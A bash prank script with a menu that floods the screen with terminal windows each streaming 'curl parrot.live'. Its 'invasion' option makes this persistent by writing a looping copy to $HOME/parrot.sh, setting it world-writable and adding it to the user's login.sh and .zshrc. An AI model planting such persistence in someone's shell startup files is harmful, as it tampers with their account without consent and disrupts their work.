#!/bin/bash

raid()
{
	nb_colonne=3
	nb_ligne=4

	width_terminal=80
	heigth_terminal=24

	width_pixel=12
	heigth_pixel=22

	for i in $(seq 0 $((nb_colonne - 1)))
	do
		for j in $(seq 0 $((nb_ligne - 1)))
		do
			((X = j * 1050))
			((Y = i * 750))

			gnome-terminal --window --geometry=${width_terminal}x${heigth_terminal}+${X}+${Y} -- bash -c "curl parrot.live; exec bash" &
		done
	done
}

# ##########################################################################################
# pas touche au 25 permiere ligne du fichier
LOOP="
TIMER=0
while true; do
	if [[ \$TIMER -ge 10 ]]; then
		raid
		TIMER=0
	fi
	TIMER=\$((\$TIMER + \$RANDOM % 4))
	sleep 10m
done"

	clear
	printf "\n\033[1;38;2;255;0;0m"

	printf "    ╭──────────────────────────╮\n"
	printf "    │ what are we going to do  │\n"

	printf "\033[0;38;2;255;0;0m"

	printf "    │ 1 - sending a raid       │\n"
	printf "    │ 2 - make an invasion     │\n"
	printf "    │ 3 - take over this place │\n"
	printf "    │ 4 - cleaning the shit    │\n"
	printf "    │ q - quit                 │\n"
	printf "    ╰──────────────────────────╯\n"

	printf "\n\033[0m"

while true;
do
	printf "\033[3m"
	read -p "Choisissez une option : " choix
	printf "\033[0m"
	case $choix in
		1)
			echo "sending a raid WAAAAA... no PIIIIIIIOOOOOOUUUU"
			raid
			;;
		2)
			head -n 25 interface.sh > $HOME/parrot.sh
			echo "$LOOP" >>  $HOME/parrot.sh
			chmod 777  $HOME/parrot.sh
			if ! grep -F "parrot.sh" $HOME/login.sh > /dev/null; then
				echo "nohup $HOME/parrot.sh" >> $HOME/login.sh
			fi
			if ! grep -F "parrot.sh" $HOME/.zshrc > /dev/null; then
				echo alias parrot="$HOME/parrot.sh" >> $HOME/.zshrc
			fi
			echo "invation setup"
			;;
		3)
			echo "not implement"
			;;
		4)
			read -p "Are you sure (y/n) ?" validate
			case $validate in
				y|Y|yes|YES)
					rm "$0"
					echo "cleaning the shit"
					exit 0;;
				*)
					echo "stoping";;
			esac
			;;
		"4 -f")
			read -p "Are you sure (y/n) ?" validate
			case $validate in
				y|Y|yes|YES)
					rm -- "$0"
					rm -- $HOME/parrot.sh;;
				*)
					echo  "stoping";;
			esac
			;;
		q)
			clear
			echo "Quit"
			curl parrot.live
			exit 0
			;;
		*)
			echo "Option invalide. :("
			;;
	esac
done
